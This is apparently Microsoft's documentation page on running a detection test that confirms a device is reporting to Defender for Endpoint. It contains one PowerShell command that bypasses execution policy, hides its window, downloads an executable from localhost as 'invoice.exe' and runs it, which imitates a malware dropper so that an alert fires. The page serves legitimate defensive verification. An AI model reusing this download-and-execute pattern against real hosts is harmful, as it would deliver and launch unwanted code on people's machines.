---
title: Run a detection test on a device recently onboarded to Microsoft Defender for Endpoint
description: Run the detection test script on a device recently onboarded to the Microsoft Defender for Endpoint service to verify that it's properly added.
search.appverid: met150
ms.service: defender-endpoint
ms.author: painbar
author: paulinbar
ms.localizationpriority: medium
ms.date: 10/20/2025
manager: bagol
audience: ITPro
ms.collection: 
- m365-security
- tier1
ms.topic: how-to
ms.subservice: onboard
appliesto:
  - Microsoft Defender for Endpoint Plan 1 and 2
---

# Run a detection test on a device recently onboarded to Microsoft Defender for Endpoint

When you add a device to the Microsoft Defender for Endpoint service for management, it's referred to as onboarding. Onboarding allows devices to report signals about their health status to the service.

Verifying that a device is added to the service successfully is a critical step in the entire deployment process. It helps ensure that all the devices expected are being managed. 

## Prerequisites

### Supported operating systems

- Windows Server 2012 R2
- Windows Server 2016 and later
- Azure Stack HCI OS, version 23H2 and later

## Verify Microsoft Defender for Endpoint onboarding of a device using a PowerShell detection test

Run the following PowerShell script on a newly onboarded device to verify that it's properly reporting to the Defender for Endpoint service.

1. On the device, open Command Prompt as an administrator. 

1. At the prompt, copy and run the following command:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

   The Command Prompt window closes automatically. If successful, a new alert appears in the portal for the onboarded device in about 10 minutes.

    > [!NOTE]
    > You can also [use the EICAR test string](/defender-endpoint/configure-extension-file-exclusions-microsoft-defender-antivirus) to perform this test. You'll receive a notification on the endpoint and an alert in the Microsoft Defender portal.

## Related articles

- [Onboard client devices](onboard-client.md)
- [Onboard servers](onboard-server.md)
- [Troubleshoot Microsoft Defender for Endpoint onboarding issues](troubleshoot-onboarding.md)


